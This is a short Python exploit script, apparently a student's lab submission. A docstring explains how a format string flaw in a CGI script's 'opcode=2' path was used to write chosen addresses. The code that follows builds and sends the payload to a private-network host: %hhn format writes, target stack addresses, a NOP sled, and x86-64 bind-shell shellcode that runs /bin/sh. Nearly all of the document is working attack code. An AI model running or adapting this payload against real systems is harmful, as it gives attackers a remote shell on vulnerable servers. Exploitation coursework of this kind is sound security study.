
"""
Khaleel Harper



For this exploit, I found a format string vulnerability in the function in logistic function when I had opcode equal to 2
2. The null bytes in the string are not skipped. I had to find a way to get around have null bytes in my string and still write to the addressesof my choice
I got around this by putting the %n's before the null bytes and finding the offset where the addresses I sent through are stored on the stack. Looking at the stack I say the addresses
I sent were not lined up the way I needed them to be. I fixed this by adding spaces to get the bytes lined up the way I needed. When I had them lined up, I figured out the new offset and wrote
the decimal values to the addresses of the target address.

"""


import socket
import webbrowser
import requests
import sys
import os


#!/usr/bin/env python
TCP_IP = '192.168.56.2'
TCP_PORT = 8002
BUFFER_SIZE = 1024
MESSAGE = "GET /cgi-bin/stats.pl? opcode=2 statsfilename="


#MESSAGE+=  '\x90\x90\x90\x90\x90\x90\x90\x90'
MESSAGE+= '%48d%29$hhn%48d%30$hhn%48d%31$hhn       '
#MESSAGE += '%26$x%27$x%28$x '


MESSAGE+=  '\xe9\xdc\xff\xff\xff\x7f\00\00'
MESSAGE+=  '\xea\xdc\xff\xff\xff\x7f\00\00'
MESSAGE+=  '\xe8\xdc\xff\xff\xff\x7f\00\00'




MESSAGE+= '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
MESSAGE+= '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
MESSAGE+= '\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a'
MESSAGE+= '\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0'
MESSAGE+= '\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02'
MESSAGE+= '\x1f\x45\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05'
MESSAGE+= '\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31'
MESSAGE+= '\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59'
MESSAGE+= '\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48'

MESSAGE+= '\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a'
MESSAGE+= '\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54'

MESSAGE+= '\x5f\x6a\x3b\x58\x0f\x05\x3e\x30\x60='

#print(MESSAGE)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(MESSAGE)
data = s.recv(BUFFER_SIZE)
s.close()
print "received data:", data
